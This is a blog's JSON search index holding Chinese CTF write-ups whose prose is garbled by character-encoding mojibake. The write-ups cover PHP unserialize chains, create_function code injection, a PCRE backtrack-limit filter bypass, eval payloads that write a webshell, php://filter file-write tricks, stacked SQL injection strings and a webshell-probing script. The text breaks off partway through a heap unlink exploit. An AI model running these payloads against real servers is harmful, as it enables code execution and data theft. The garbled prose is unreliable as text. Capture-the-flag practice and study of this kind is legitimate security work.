{"pages":[{"title":"404","text":"","path":"404/index.html","date":"09-09","excerpt":""},{"title":"about","text":"æ­»è‚¥å®… çœŸæ¶å¿ƒ","path":"about/index.html","date":"09-09","excerpt":""},{"title":"surprised","text":"heheh :)","path":"surprised/index.html","date":"09-09","excerpt":""},{"title":"éšç¬”ï¼ˆä¹±å‡ æŠŠå†™ï¼‰","text":"2018-09-20 01:40:10 å»ºè¿™ä¸ªæ˜¯ä¸ºäº†å†™ç‚¹ä»€ä¹ˆï¼Œä½†æ˜¯å»ºå®Œä¹‹ååˆä¸çŸ¥é“å†™ä»€ä¹ˆäº†ã€‚ã€‚ã€‚ã€‚å†™æ„Ÿæƒ³åˆæ€•å¤ªçŸ«æƒ…ï¼Œç®—äº†ç•™ç€ä¹‹åçœ‹çœ‹æƒ³å†™ä»€ä¹ˆå§ã€‚","path":"essays/index.html","date":"09-20","excerpt":""},{"title":"plan","text":"","path":"plan/index-2.html","date":"09-20","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"09-09","excerpt":""},{"title":"è—ç€ä¸€äº›å°ç§˜å¯†ã€‚ã€‚","text":"çœ‹çœ‹å¤§å“¥æ”¶è—çš„ Web å®‰å…¨Web-Security-Learning PWN çˆ·çˆ·PWNABLEropemporium &gt;&gt; ä¸€ç³»åˆ— ROP é¢˜ç›®Linux ç³»ç»Ÿå‡½æ•°å¤§å…¨ä¸€æ­¥ä¸€æ­¥å­¦ROPä¹‹linux_x86ç¯‡ å¥½å¥½æ‰“ CTF å§ctf-all-in-onectf-wiki &lt;&lt; å’Œä¸Šé¢è¿™ä¸ªä¸€èµ·é£Ÿç”¨ å¹³å° CTF TIMES &lt;&lt; å¾ˆä¸é”™çš„å¹³å°Jarvis OJå®éªŒå§bug kui æ˜¥ç§‹php-security-calendar-2017","path":"collections/index.html","date":"09-11","excerpt":""},{"title":"ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™èƒ½æä¸Šæ—¥ç¨‹çš„è¿‘æœŸè®¡åˆ’ ğŸ‘‡","text":"2019-09-20 æŠŠ PWN å…¥é—¨æ—©ç‚¹ç»“æŸå§ï¼ˆæ±‚ä½ äº†ï¼‰ æ¯å‘¨å­¦ä¹ ä¸€ä¸ª Web å®‰å…¨ è¯»å®Œç å†œç¿»èº« è¯»å®Œç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»","path":"plan/index.html","date":"09-20","excerpt":""},{"title":"plan","text":"","path":"plan/index-1.html","date":"09-20","excerpt":""}],"posts":[{"title":"å¼ºç½‘æ¯éƒ¨åˆ† Web ç¬”è®°","text":"å‰è¨€è¿™æ¬¡å¼ºç½‘æ¯åªåšå‡ºä¸€é“é¢˜ã€‚ã€‚ã€‚ç¡®å®éå¸¸èœï¼Œä½†æ˜¯ WP çœ‹æ‡‚äº†ä¸‰é“ï¼Œå˜»å˜»ã€‚è¿™é‡Œåšä¸ªæ€»ç»“å§ã€‚ è¿™é‡Œæœ‰ä¸ªæ›´å¥½çš„ WPï¼šWP æˆ‘ä¹Ÿä¸çŸ¥é“é¢˜ç›®åæ˜¯å•¥ï¼Œå°±ç”¨ web1 2 3 ä»£æ›¿å§ã€‚ã€‚ web1æºç ä¸‹è½½ï¼šweb1 è¿™é¢˜æ˜¯é¢˜ååºåˆ—åŒ–çš„ï¼Œå…¶å®å¾ˆç®€å•ã€‚ çœ‹çœ‹æ€è·¯ï¼š ä¸€çœ‹ï¼ŒTP5ï¼Œç‚¹å¼€ applicationï¼Œå¯ä»¥çœ‹åˆ°ä¸ª web æ¨¡å—ï¼Œè¿™é‡Œåˆ—ä¸€ä¸‹æ–‡ä»¶ï¼š 123456â”œâ”€â”€ webâ”‚ â”œâ”€â”€ controllerâ”‚ â”‚ â”œâ”€â”€ Index.phpâ”‚ â”‚ â”œâ”€â”€ Login.phpâ”‚ â”‚ â”œâ”€â”€ Profile.phpâ”‚ â”‚ â”œâ”€â”€ Register.php ä»£ç æ–‡ä»¶ä¸å¤šï¼Œæˆ‘ä»¬éšä¾¿ç¿»ç¿»ï¼Œå¤§è‡´çœ‹äº†çœ‹ä¼šå‘ç°æ²¡ä»€ä¹ˆå±å®³ç‚¹ã€‚ ç„¶åæˆ‘ä»¬å¾ˆå¿«å°±èƒ½æ³¨æ„åˆ°åœ¨ Index.php çš„ login_check å‡½æ•°ä¸­æœ‰è¿™ä¹ˆä¸¤å¥ï¼š 1234$profile=cookie(&apos;user&apos;);if(!empty($profile))&#123; $this-&gt;profile=unserialize(base64_decode($profile)); ... æ²¡é”™ï¼Œååºåˆ—åŒ–ï¼Œç¬¬ä¸€ä¸ªæƒ³åˆ°çš„ __wakeup å’Œ __destructï¼Œå†ç¿»ç¿»ï¼Œæˆ‘ä»¬å¾ˆå¿«å°±èƒ½ç¿»åˆ°åœ¨ Register.php é‡Œæœ‰å…¨åœºå”¯ä¸€çš„ __destructã€‚ 123if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index();&#125; è¿™é‡Œè°ƒç”¨äº† index å‡½æ•°ï¼Œä½†æ˜¯å››ä¸ªæ–‡ä»¶è¦ä¸å°±æ²¡ indexï¼Œè¦ä¸å°±æ²¡å•¥ç”¨ã€‚ä½†æ˜¯æˆ‘ä»¬å¾ˆå¿«åˆèƒ½çœ‹åˆ°åœ¨ Profile.php ä¸­æœ‰ï¼š 123456public function __call($name, $arguments)&#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125;&#125; æ²¡é”™ï¼Œ __call ï¼Œè¿™ä¸ªç±»åˆæ°å¥½æ²¡æœ‰ index å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ‰åŠæ³•åˆ°è¿™é‡Œæ¥ï¼Œå…ˆæ— è§†é‚£ä¸ª if æ¡ä»¶ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯è°ƒç”¨å½“å‰ç±»çš„ä»»æ„å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹è¿™ä¸ªç±»é‡Œæœ‰ä»€ä¹ˆæœ‰å±å®³çš„å‡½æ•°ã€‚ã€‚ã€‚ ç„¶åæˆ‘ä»¬å¾ˆå¿«å°±èƒ½çœ‹åˆ°ï¼š 1234567891011121314151617public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url=&quot;http://&quot;.$_SERVER[&apos;HTTP_HOST&apos;].$_SERVER[&apos;SCRIPT_NAME&apos;].&quot;/index&quot;; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $this-&gt;filename=md5($_FILES[&apos;upload_file&apos;][&apos;name&apos;]).&quot;.png&quot;; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); ç¬¬ä¸€ä¸ª if æˆ‘ä»¬å¯ä»¥å…ˆæ— è§†ã€‚æˆ‘ä»¬å…ˆçœ‹çœ‹æœ€åé‚£ä¸ª copy å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä¸¤ä¸ªå‚æ•°å€¼åˆ†åˆ«æ˜¯åœ¨ä¸Šé¢é‚£ä¸ª if å†…èµ‹å€¼çš„ï¼Œæ¡ä»¶æ˜¯ï¼š if(!empty($_FILES)){ è¿™é‡Œæ˜¯åˆ¤æ–­æ˜¯å¦ä¸Šä¼ äº†æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼šæˆ‘ä»¬åªè¦ä¸ä¸Šä¼ æ–‡ä»¶ï¼Œfilename_tmp å’Œ filename å°±ä¸ä¼šè¢«é‡æ–°èµ‹å€¼ï¼Œæˆ‘ä»¬ä¹Ÿå°±å¯ä»¥éšæ„æ“ä½œäº†ã€‚ æˆ‘çš„æƒ³æ³•æ˜¯å…ˆä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œç„¶ååœ¨å›¾ç‰‡æœ€ååŠ ä¸€å¥è¯ï¼Œç„¶åå†æ„é€  payload ä¿®æ”¹ å›¾ç‰‡åç¼€ã€‚ è¿™é‡Œè´´ä¸€ä¸‹æˆ‘çš„ payload å°±è¡Œäº†ï¼š æˆ‘æ˜¯ç›´æ¥å† login_check æ„é€ çš„ï¼Œä¸»è¦æ˜¯å› ä¸ºæ‡’ã€‚ web2æºç ä¸‹è½½ï¼š web2 è¿™ä¸€é¢˜çœ‹ï¼Œä¸€å¤§å † webshellã€‚ä½†æ˜¯å¤§éƒ¨åˆ†éƒ½æ˜¯ï¼š 12$_GET[&apos;a&apos;] = &apos; &apos;;eval($_GET[&apos;a&apos;]); æˆ–è€… 12if(&apos;a&apos;==&apos;b&apos;)eval($_GET[&apos;xixi&apos;]); è¿™ä¸¤ç§ï¼Œä¸€å¼€å§‹æˆ‘æœ‰ä¸ªæƒ³æ³•ï¼Œå°±æ˜¯æŠŠè¿™ä¸¤ç§å…¨éƒ¨æ›¿æ¢æ‰ï¼Œç„¶åå†æ”¾åˆ°å®‰å…¨ç‹—é‡Œæ‰«æ‰«ï¼Œä½†æ˜¯è¿™ä¹Ÿå¤ªéº»çƒ¦ï¼Œäºæ˜¯æˆ‘å°±æ²¡å»åšäº†ã€‚ã€‚ èµ›åçœ‹ WP å‘ç°å¯ä»¥æŠŠå…¨éƒ¨ _GET å’Œ _POST æå–å‡ºæ¥ï¼Œä¸€ä¸ªä¸€ä¸ªå»è¯•ï¼Œè¿™ä¸ªæƒ³æ³•ç¡®å®æ–¹ä¾¿å¾ˆå¤šã€‚ã€‚è´´ä¸Šè‡ªå·±çš„ jo æœ¬ï¼ˆå‚è€ƒäº†è¡¨å“¥ä»¬ï¼‰ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import reimport osimport timeimport requestsimport threadingwebshell_dir = &apos;C:/wamp64/www/ctf/qiangwang/web2/src/&apos;webshells = os.listdir(webshell_dir)def request(url,get=&apos;&apos;,post=&apos;&apos;): r = requests.get(url,params=get,data=post) if r.text.find(&quot;ruozhi&quot;)&gt;0: print(&quot;success : &quot;, url) def req(file,get_arr,post_arr): cmd = &apos;echo &quot;ruozhi&quot;;&apos;; web = &apos;http://127.0.0.1/ctf/qiangwang/web2/src/&apos;+file get_arg = &#123;&#125; post_arg = &#123;&#125; for arg in get_arr: get_arg[arg] = cmd for arg in post_arr: post_arg[arg] = cmd request(web,get=get_arg,post=post_arg) def strip_quote(arr): if arr == None: return [] tmp = [] for i in arr: tmp.append(i.strip(&quot;&apos;\\&quot;&quot;)) return tmpdef find_args(text): get_args =strip_quote(re.findall(&quot;\\$_GET\\[(.*?)\\]&quot;,text)); post_args =strip_quote(re.findall(&quot;\\$_POST\\[(.*?)\\]&quot;,text)); return (get_args,post_args)for i in webshells: print(&apos;find : &apos;,i) f = open(webshell_dir+i,&apos;r&apos;) (get_args,post_args) = find_args(&apos;&apos;.join(f.readlines())) threading.Thread(target=req,args=(i,get_args,post_args,)).start() web3è¿™é¢˜è¿‡æ»¤äº† selectï¼Œè€ƒçš„æ˜¯å †å æ³¨å…¥ï¼Œå³ï¼š select 1 ;select2 æ€è·¯ 1è¿™é‡Œä¸¢å‡ ä¸ªæ€è·¯ï¼Œ æœ€å…ˆçœ‹åˆ°çš„ï¼š â€˜;use supersqli ; set @sql=concat(â€˜sâ€™,â€™elect `flag` from `1919810931114514`â€˜);PREPARE stmt1 FROM @sql;EXECUTE stmt1;â€“ è¿™æ˜¯åŠ¨æ€æŸ¥è¯¢ æ€è·¯2ç„¶åç¬¬äºŒä¸ªæ€è·¯æ˜¯ä»ä¸€å¼€å§‹åˆ†äº«çš„é‚£ä¸ªé“¾æ¥é‡Œçœ‹åˆ°çš„ï¼š é€šè¿‡å°† 1919810931114514ï¼ˆflagè¡¨ï¼‰ è¡¨åä¿®æ”¹ä¸º words(é»˜è®¤çš„æŸ¥è¯¢è¡¨) å°†flag è¡¨é‡Œçš„çš„ flag å­—æ®µå æ”¹æˆ id ç„¶å 1&#39;||&#39;1 æ³¨å…¥å‡ºå…¨éƒ¨æ•°æ®å°±å¯ä»¥çœ‹åˆ° flag äº† æ€è·¯3ç¬¬ä¸‰ä¸ªæ€è·¯æ˜¯å’Œè¡¨å“¥äº¤æµçš„æ—¶å€™å­¦åˆ°çš„ã€‚ 1â€™;handler `1919810931114514` open;handler `1919810931114514` read first# è¿™ä¸ªä¸æ˜¯é‡ç‚¹ï¼Œè¡¨å“¥æ˜¯è¿™ä¹ˆè¯´çš„ï¼š 1234æˆ‘ä»¬æŒ‰ç€æ‰‹å†ŒæŒ¨ä¸ªè¯•çš„å¾ˆç®€å•ã€‚ã€‚å°±å‡ åˆ†é’Ÿå°±mysqlæ‰‹å†Œ æ‰‹å†Œé“¾æ¥ï¼šhttps://dev.mysql.com/doc/refman/5.7/en/handler.html ä¸‹æ¬¡æˆ‘ä¹Ÿç¿»~å•§","path":"2019/06/01/å¼ºç½‘æ¯éƒ¨åˆ† Web ç¬”è®°/","date":"06-01","excerpt":""},{"title":"å››é“ Code-Breaking Puzzles çš„ç¬”è®°","text":"ä¸»è¦å‚è€ƒï¼šCode Breaking æŒ‘æˆ˜èµ› Writeup çœ‹ç€ WP åšäº†å››é“ php çš„é¢˜ç›®ï¼Œè·Ÿä¸€ä¸‹ï¼š easy1234567891011&lt;?php$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123; show_source(__FILE__);&#125; else &#123; $action(&apos;&apos;, $arg);&#125;?&gt; è¿™é“é¢˜ä¸¤ä¸ªçŸ¥è¯†ç‚¹å§ï¼š ^[a-z0-9_]*$/isD æ­£åˆ™è¡¨è¾¾å¼å¤§æ¦‚å°±æ˜¯æƒ³è¯´ï¼ŒåŒ¹é… a-z0-9_ å¼€å¤´ä¸”ç»“å°¾çš„ä¸œè¥¿ã€‚å°±ä¸è¿›å…¥ elseè¿™ç‚¹å¾ˆå¥½ç»•è¿‡ï¼Œå›æƒ³ä¸€ä¸‹å‘½åç©ºé—´ï¼Œå¯ä»¥åœ¨å‡½æ•°å‰åŠ ä¸ª \\ã€‚ $action(&#39;&#39;, $arg); ç¬¬äºŒä¸ªçš„è¯ï¼Œæˆ‘ä»¬è¦æ‰¾ä¸€ä¸ªå‡½æ•°ï¼Œåªèƒ½æ§åˆ¶ç¬¬äºŒä¸ªå‚æ•°ï¼Œæ‰§è¡Œä»£ç ã€‚å½“ç„¶æˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°ï¼ˆ WP è¯´çš„ï¼‰ï¼Œcreate_function create_function : create_function ( string \\$args , string $code ) å¤§æ¦‚å°±æ˜¯è¿™æ ·çš„ï¼š $b = create_function(â€˜â€™,â€™echo 1;â€™); ç”¨æ­£å¸¸çš„æ–¹æ³•å®šä¹‰ï¼Œç­‰äºï¼š1function b()&#123;echo 1;&#125; å¦‚æœæˆ‘ä»¬å¯ä»¥æ”¹å˜ echo 1; è¿™ä¸ªä½ç½®çš„åœ°æ–¹ã€‚æˆ‘ä»¬å¯ä»¥æ”¹æˆè¿™æ ·ï¼š 1function b()&#123;echo 1;&#125;eval($_GET[1]);//&#125; è¿™æ ·å°±ç›¸å½“äºé—­åˆäº†è¿™ä¸ªå‡½æ•°ï¼Œå†™äº†ä¸€è¡Œæ–°çš„ä»£ç äº†ã€‚è€Œä¸”è¿™æ ·æ˜¯å¯ä»¥çš„ï¼ï¼ æ‰€ä»¥è¿™é¢˜çš„ payload å°±æ˜¯ï¼š?action=\\create_function&amp;arg=echo%201;}eval($_GET[1]);// ä¸è¿‡ create_function å‡½æ•°åœ¨ php7.2 åå·²ç»åºŸå¼ƒäº†ã€‚ pcrewaf1234567891011121314151617181920212223&lt;?phpfunction is_php($data)&#123; return preg_match(&apos;/&lt;\\?.*[(`;?&gt;].*/is&apos;, $data);&#125;if(empty($_FILES)) &#123; die(show_source(__FILE__));&#125;$user_dir = &apos;data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]);$data = file_get_contents($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);if (is_php($data)) &#123; echo &quot;bad request&quot;;&#125; else &#123; @mkdir($user_dir, 0755); $path = $user_dir . &apos;/&apos; . random_int(0, 10) . &apos;.php&apos;; move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $path); header(&quot;Location: $path&quot;, true, 303);&#125;?&gt; åˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼šè¿™é“é¢˜å¯ä»¥ç®€åŒ–æˆï¼š 123456789&lt;?phpfunction is_php($data)&#123; return preg_match(&apos;/&lt;\\?.*[(`;?&gt;].*/is&apos;, $data);&#125;$data = $_GET[&apos;data&apos;];if (!is_php($data)) &#123; file_put_contents(&quot;test2.php&quot;,$data);&#125;?&gt; å¤§æ¦‚å°±æ˜¯ï¼Œ&lt;? åä¸èƒ½æœ‰å†…å®¹ï¼ˆæˆ‘ä¹Ÿè¯´ä¸æ˜ç™½ã€‚ å…³äº æœ‰é™çŠ¶æ€è‡ªåŠ¨æœºï¼Œpç¥å·²ç»å†™çš„å¾ˆæ¸…æ¥šäº† PHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶ æˆ‘çš„ç†è§£å¤§æ¦‚å°±æ˜¯ï¼ŒåŒ¹é…è¿‡ç¨‹ä¸­å¦‚æœåŒ¹é…ä¸ä¸Šä¼šå›æº¯ï¼Œä½†æ˜¯å›æº¯ä¼šå½±å“æ€§èƒ½ï¼Œæ‰€ä»¥è‚¯å®šæœ‰ä¸€ä¸ªå›æº¯çš„ç•Œé™ï¼Œè¿™ä¸ªç•Œé™åœ¨ php.ini ä¸­å¯ä»¥è®¾ç½®ï¼špcre.backtrack_limit=100000ï¼Œé»˜è®¤å…¶å®æ˜¯ 1000000ï¼ˆ100ä¸‡ï¼‰ã€‚ å½“å›æº¯æ¬¡æ•°è¶…è¿‡ 100ä¸‡ å°±ä¼šç›´æ¥è¿”å› falseã€‚ æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥å‘é€ï¼š&lt;?php echo 1; ?&gt;a*1000000 å¤§æ¦‚å°±æ˜¯è¿™æ ·å•¦ï¼Œè‡³äºä¸ºä»€ä¹ˆ b å’Œ c ä¸­é—´è¦æœ‰ä¸ª .* ï¼Œæ˜¯å› ä¸ºè¦æœ‰ä¸ª å›æº¯ çš„è¿‡ç¨‹ï¼Œè¯¦ç»†å¯ä»¥çœ‹çœ‹pç¥çš„æ–‡ç« ã€‚ phpmagic1234567&lt;?phpif(&apos;;&apos; === preg_replace(&apos;/[^\\W]+\\((?R)?\\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) &#123; eval($_GET[&apos;code&apos;]);&#125; else &#123; show_source(__FILE__);&#125;?&gt; åˆåˆåˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¿™é‡Œçš„æ„æ€å¤§æ¦‚å°±æ˜¯ï¼Œå»æ‰ \\w+()ï¼Œæœ€ååªèƒ½ä¸€ä¸ªåˆ†å·çš„è¯ï¼Œå°±å¯ä»¥ã€‚ å†è¯´ç™½ç‚¹å°±æ˜¯å¯ä»¥è°ƒç”¨å‡½æ•°ï¼Œä½†æ˜¯ä¸èƒ½æœ‰å‚æ•°ã€‚ è¿™å¾—éå¸¸äº†è§£ php çš„å‡½æ•°äº†ã€‚æˆ‘è¿™ç§åªä¼šå†™ Hello world çš„ã€‚ã€‚ã€‚ã€‚ æˆ‘ä»¬æœ‰ä¸€ä¸ªå‡½æ•°ï¼šget_defined_vars get_defined_vars â€” è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ å¤§æ¦‚é•¿è¿™æ ·: é‡Œé¢æœ‰ _GET _POST _SERVER _FILES ç­‰ç­‰ã€‚ã€‚ æˆ‘ä»¬å‘ç°ç¬¬ä¸€ä¸ªå°±æ˜¯ get ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†ç”¨ current å‡½æ•°ã€‚ ä»€ä¹ˆï¼Œä½ é—®æˆ‘ current å‡½æ•°æ˜¯ä»€ä¹ˆï¼Ÿ è¿”å› å†…éƒ¨æŒ‡é’ˆå½“å‰æŒ‡å‘çš„å€¼ã€‚å°±æ˜¯ _GET å•¦ï¼Œå¦‚æœç”¨ next()ï¼Œå°±æ˜¯ _POSTï¼Œè¿™ä¸¤ä¸ªæˆ‘ä»¬éƒ½å¯ä»¥æ§åˆ¶çš„ã€‚ ä½†æ˜¯è¿™æ˜¯ä¸ªæ•°ç»„å‘€ï¼Œæœ‰æ²¡æœ‰ä¸€ä¸ªå‡½æ•°å¯ä»¥æ•°ç»„æ‹¼æ¥æˆå­—ç¬¦ä¸²å‘¢ï¼Ÿæœ‰ï¼šimplodeã€‚ äºæ˜¯æˆ‘ä»¬çš„ payload æ¨ªç©ºå‡ºä¸–ï¼š?a=print_r(123);//&amp;code=eval(implode(current(get_defined_vars()))); å¦‚æœè§‰å¾—å¥‡æ€ªå¯ä»¥è°ƒè¯•è°ƒè¯•ã€‚ã€‚ æˆ–è€…å¹²è„†ï¼ŒGET æäº¤ï¼šcode=eval(implode(current(get_defined_vars())));ç„¶å POST æäº¤ï¼šhhh=file_put_contents(&#39;ceshi.php&#39;,&#39;&lt;?php eval($_GET[1]); ?&gt;&#39;); å­¦ä¹ ä¸€ä¸‹åˆ«äººçš„ payloadï¼šcode=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); phpmagic123456789101112131415161718192021222324252627 &lt;?phpif(isset($_GET[&apos;read-source&apos;])) &#123; exit(show_source(__FILE__));&#125;define(&apos;DATA_DIR&apos;, dirname(__FILE__) . &apos;/data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]));if(!is_dir(DATA_DIR)) &#123; mkdir(DATA_DIR, 0755, true);&#125;chdir(DATA_DIR);$domain = isset($_POST[&apos;domain&apos;]) ? $_POST[&apos;domain&apos;] : &apos;&apos;;$log_name = isset($_POST[&apos;log&apos;]) ? $_POST[&apos;log&apos;] : date(&apos;-Y-m-d&apos;);if(!empty($_POST) &amp;&amp; $domain): $command = sprintf(&quot;dig -t A -q %s&quot;, escapeshellarg($domain)); $output = shell_exec($command); $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES); $log_name = $_SERVER[&apos;SERVER_NAME&apos;] . $log_name; if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [&apos;php&apos;, &apos;php3&apos;, &apos;php4&apos;, &apos;php5&apos;, &apos;phtml&apos;, &apos;pht&apos;], true)) &#123; file_put_contents($log_name, $output); &#125; echo $output;endif; ?&gt; è¿™é“é¢˜è¦ç”¨åˆ° dig ï¼Œæ‰€ä»¥è¦æ”¾åœ¨ linux ä¸‹ã€‚ æˆ‘ä»¬çœ‹åˆ°å‘½ä»¤æ‰§è¡Œå‰æœ‰ä¸ª escapeshellarg è¿™ä¸ªã€‚ç»•ä¸è¿‡å»ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œæ˜¯å¯ä»¥æ§åˆ¶è¿”å›å€¼çš„éƒ¨åˆ†å†…å®¹ï¼š é‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯èƒ½ç›´æ¥å†™ &lt;?php ... ?&gt; äº†å‘¢ï¼Ÿ ä¸è¡Œï¼Œå› ä¸ºè¿˜æœ‰ä¸ª htmlspecialcharsã€‚ ç„¶ååœ¨ä¸‹é¢è¿˜æœ‰ é»‘åå• åˆ¤æ–­äº†åç¼€ã€‚ if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;], true)) è¿™é‡Œæœ‰ä¸ª tips ç»•è¿‡é»‘åå•ï¼ša.php/.ã€‚ è¿™é‡Œç»•è¿‡äº†ï¼Œæˆ‘ä»¬æ€ä¹ˆå†™ php å‘¢ï¼Ÿå¯ä»¥ç”¨ base64 å†™å•Šï¼Œå°±æ˜¯ï¼šphp://filter/ ä¼ªåè®®å’¯ã€‚ å½“ç„¶ï¼Œè¿™é‡Œè¿˜æœ‰ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å‘ç° $log_name æ˜¯è¿™ä¹ˆæ‹¼æ¥çš„ï¼š $log_name = $_SERVER[&#39;SERVER_NAME&#39;] . $log_name; æœ‰ä¸ª SERVER_NAMEï¼Œè¿™ä¸ª SERVER_NAME å°±æ˜¯è·å–è¯·æ±‚å¤´ä¸­çš„ hostï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ host å¤´æ¥æ”¹å˜ã€‚ æˆ‘å…ˆå†™ä¸ª echo 1 è¯•è¯•ï¼Œæˆ‘ä»¬çš„ payload ï¼š å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ domain å‰é¢è¿˜æœ‰ä¸¤ä¸ª 1ï¼Œè¿™æ˜¯æ‹¿æ¥å¡«å……çš„ï¼Œå› ä¸º base64 æ˜¯æŒ‰å››ä¸ªå­—èŠ‚è§£ç çš„ï¼Œå‰é¢çš„å­—ç¬¦å‡‘èµ·æ¥ä¸æ˜¯ 4 çš„å€æ•°ï¼Œæ‰€ä»¥å¡«å……ä¸Š 11 ä½†æ˜¯ä½ ä¼šå‘ç°ï¼š whatï¼Ÿæ²¡æœ‰å†…å®¹ï¼Ÿ å“ªé‡Œå‡ºé—®é¢˜äº†å‘¢ï¼ŸåŸå› å°±åœ¨è¿™ä¸ª = å·ä¸Šé¢ã€‚æˆ‘ä»¬æŠŠ ç­‰äºå· åˆ äº†ï¼Œå°±å¯ä»¥äº†ï¼ˆå…·ä½“åŸå› æœªçŸ¥ã€‚ã€‚ã€‚ï¼‰ ä¸è¿‡å¯èƒ½å› ä¸ºæ–‡ä»¶åæœ€åçš„ /. çš„åŸå› ï¼Œè¿™é‡Œæ˜¯ä¸èƒ½è¦†ç›–æ–‡ä»¶çš„ï¼Œæ‰€ä»¥è¦æŠŠæºæ–‡ä»¶åˆ äº†æˆ–è€…æ¢ä¸ªæ–‡ä»¶åæ‰è¡Œã€‚ æˆ‘ä»¬åˆ æ‰ ç­‰äºå· è¯•è¯•ï¼š å¯ä»¥äº†ï¼ï¼ è¿™é‡Œä¸€å¼€å§‹ä¹Ÿæœ‰æƒ³ç”¨ string.rot13 çš„ï¼Œä½†æ˜¯ rot13 å¹¶ä¸ä¼šè½¬æ¢ &lt;?ã€‚ è¿™é‡Œå°±è¦è¯´ä¸€ä¸‹ï¼Œåœ¨ windows è¿˜æœ‰ä¸ªæ–¹æ³•ç”šè‡³èƒ½ç»•è¿‡ç™½åå•ï¼Œå°±æ˜¯æŠŠæ–‡ä»¶åè®¾ç½®æˆï¼š a.php;1.jpgã€‚ä½†æ˜¯é‚£æ ·æ–‡ä»¶çš„å†…å®¹ä¼šå˜æˆ ç©º ï¼Œä¸çŸ¥é“ä¸ºå•¥ã€‚ã€‚ç®—äº†","path":"2019/05/02/å››é“ Code-Breaking Puzzles çš„ç¬”è®°/","date":"05-02","excerpt":""},{"title":"unlink çš„åˆçº§ç”¨æ³•","text":"hgame çš„ä¸€é“ç®€å•é¢˜ä¸€é“å¾ˆï¼ˆtmï¼‰ ç®€å•çš„é¢˜ã€‚ã€‚å”‰~ exp å’ŒäºŒè¿›åˆ¶æ–‡ä»¶ å…ˆçœ‹çœ‹åŠŸèƒ½ï¼š æ ‡å‡†çš„å †é¢˜é€‰é¡¹ï¼Œä¾æ­¤çœ‹çœ‹åŠŸèƒ½ï¼š æ¼æ´ç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯åœ¨ set_name æ—¶ç”³è¯·çš„æ—¶ 0x80ï¼Œä½†æ˜¯åœ¨ reset_name å´è¯»äº† 0x100 ä¸ªå­—èŠ‚ã€‚ æˆ‘ä»¬å¯ä»¥ä¿®æ”¹åˆ° sizeï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥ unlink ä¸Šä¸€ä¸ªå—ã€‚æ²¡é”™ï¼Œunlink æœ‰æ£€æµ‹ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªæŒ‡é’ˆï¼Œå°±æ˜¯åœ¨ bss æ®µä¸­å­˜ç€ name çš„å †åœ°å€çš„æ•°ç»„å˜é‡ï¼šptrã€‚ çœ‹ä¸€ä¸‹unlink çš„æ£€æµ‹ï¼š if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0)) malloc_printerr (&quot;corrupted double-linked list&quot;); ç†ä¸€ä¸‹æµç¨‹ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸¤ä¸ªchunkï¼ˆéƒ½ä¸ä¸ topchunk ç›¸è¿ï¼‰ï¼Œå°±å« chunk1 å’Œ chunk2 å§ï¼Œå¤§å°ä¸º 0x90ã€‚ è°ƒç”¨ reset_name ç¼–è¾‘ chunk1 çš„æ—¶å€™å»è¦†ç›– chunk2 çš„ prev_szie å’Œ sizeï¼Œéƒ½è¦†ç›–ä¸º 0x90 ã€‚ è°ƒç”¨ delete_name åˆ é™¤ chunk2ã€‚ æ­¤æ—¶åº”è¯¥ä¼šè°ƒç”¨ï¼š unlink(chunk1) 